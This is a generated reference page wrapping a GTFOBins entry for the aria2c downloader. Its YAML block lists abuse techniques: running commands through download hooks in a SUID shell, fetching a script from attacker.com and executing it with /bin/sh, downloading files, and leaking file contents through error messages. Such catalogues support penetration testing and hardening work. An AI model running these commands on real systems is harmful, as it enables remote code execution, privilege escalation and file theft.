---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# aria2c

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `aria2c` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/aria2c` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [aria2c](../../tools/linux/aria2c.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | aria2c |
| name | aria2c |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/aria2c/ |

## Preserved Source Material

```yaml
_body: ''
_name: aria2c
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/aria2c
functions:
  command:
  - code: 'echo /path/to/command >/path/to/temp-file

      chmod +x /path/to/temp-file

      aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain'
    comment: Note that the subprocess is immediately sent to the background.
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  - code: aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
    comment: The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`.
      Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed
      multiple times with the same GID.
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  download:
  - code: aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file
    comment: Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is
      saved to `input-file` in the current working directory.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-read:
  - binary: false
    code: aria2c -i /path/to/input-file
    comment: The file is leaked as error messages.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
```
